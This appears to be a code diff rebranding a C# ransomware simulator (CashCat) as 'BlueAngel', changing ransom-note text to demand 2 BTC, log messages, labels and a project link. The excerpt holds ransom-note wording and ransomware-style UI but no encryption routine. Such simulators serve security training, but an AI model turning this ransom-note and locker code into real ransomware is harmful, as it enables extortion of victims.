@@ -35,8 +35,8 @@ namespace CashCat
         public string currentPath;
 
         private bool encryptionInProgress = false;
-        private string inProgressMessage = "Your important files are being encrypted!" + System.Environment.NewLine + System.Environment.NewLine + "Your files are being locked using a unique public RSA-4096 generated for this computer. Once the encryption operations are completed you will be unable to access your files without obtaining a special key from our internet dark web cyber server." + System.Environment.NewLine + System.Environment.NewLine + "Be prepared to pay the Ransom!";
-        private string completedMessage = "Your important files are now encrypted!" + System.Environment.NewLine + System.Environment.NewLine + "The lock was produced using a unique public RSA-4096 generated for this computer. To decrypt files you need to obtain the private key. The Single copy of the private key which allow you to decrypt the files is on a secret server on the internet dark web. The server will destroy the key after a time specified in this window." + System.Environment.NewLine + System.Environment.NewLine + "To obtain the private key for this computer, you need dot pay 300 USD / 300 EUR similar amount in other currency.";
+        private string inProgressMessage = "Your important files are being encrypted!" + System.Environment.NewLine + System.Environment.NewLine + "Your files are being locked using a unique public RSA-4096 generated for this computer. Once the encryption operations are completed you will be unable to access your files without obtaining an unlock code from our internet dark web cyber server." + System.Environment.NewLine + System.Environment.NewLine + "Be prepared to pay the Ransom!";
+        private string completedMessage = "Your important files are now encrypted!" + System.Environment.NewLine + System.Environment.NewLine + "Your files are now encrypted with a RSA4096 generated for this computer. To decrypt files you need to obtain the private key by sending 2 BTC at SuperDuperSecretBitCoinAccount. The server will destroy the key after a time specified in this window." + System.Environment.NewLine + System.Environment.NewLine + "To obtain the private key for this computer, you need dot pay 2 BTC.";
         private string inProgressDecryptingMessage = "Your important files are being decrypted!" + System.Environment.NewLine + System.Environment.NewLine + "Congratulations! Your files are being unlocked using the unique public RSA-4096 generated for this computer.";
         private string decryptedMessage = "Your important files are now decrypted!" + System.Environment.NewLine + System.Environment.NewLine + "Thank You for being a great customer.";
 
@@ -51,11 +51,11 @@ namespace CashCat
             fileOperations = new FileSystemOperation();
             encryptionOperation = new EncryptionOperation();
 
-            fileOperations.WriteLog("CashCat Started!");
+            fileOperations.WriteLog("BlueAngel Started!");
 
             fileOperations.LogKeyData(encryptionOperation.getRSAPrivateKey(),encryptionOperation.getRSAPublicKey());
 
-            fileOperations.WriteLog("CashCat Searching for Config!");
+            fileOperations.WriteLog("BlueAngel Searching for Config!");
 
             //Load Config JSON
             currentPath = AppDomain.CurrentDomain.BaseDirectory;
@@ -64,7 +64,7 @@ namespace CashCat
 
             if (CurrentConfig != null)
             {
-                fileOperations.WriteLog("CashCat found a Config!");
+                fileOperations.WriteLog("BlueAngel found a Config!");
 
                 //If Webhookenabled is true..
                 if (CurrentConfig.webHookEnabled)
@@ -94,8 +94,8 @@ namespace CashCat
                 if (CurrentConfig.catMode)
                 {
                     // Enable Cat Mode
-                    fileOperations.WriteLog("ENABLING CAT MODE!");
-                    lblMainLabel.Content = "CashCat has encrypted your files!";
+                    fileOperations.WriteLog("ENABLING ANGEL MODE!");
+                    lblMainLabel.Content = "BlueAngel has encrypted your files!";
                     LockerIcon.Visibility = Visibility.Collapsed;
                     maingrid.Background = new SolidColorBrush(Colors.Transparent);
                     CashCatBackground.Visibility = Visibility.Visible;
@@ -105,7 +105,7 @@ namespace CashCat
             }
             else
             {
-                fileOperations.WriteLog("CashCat DID NOT FIND a Config - using default settings!");
+                fileOperations.WriteLog("BlueAngel DID NOT FIND a Config - using default settings!");
             }
 
         }
@@ -258,9 +258,12 @@ namespace CashCat
 
         private void RichTextBox_MouseDown(object sender, MouseButtonEventArgs e)
         {
-            System.Diagnostics.Process.Start("https://github.com/leeberg/CashCatRansomwareSimulator");
+            System.Diagnostics.Process.Start("https://github.com/Fruxlabs/BlueAngel/");
         }
 
-        
+        private void txtbox_Instructions_TextChanged(object sender, TextChangedEventArgs e)
+        {
+
+        }
     }
 }
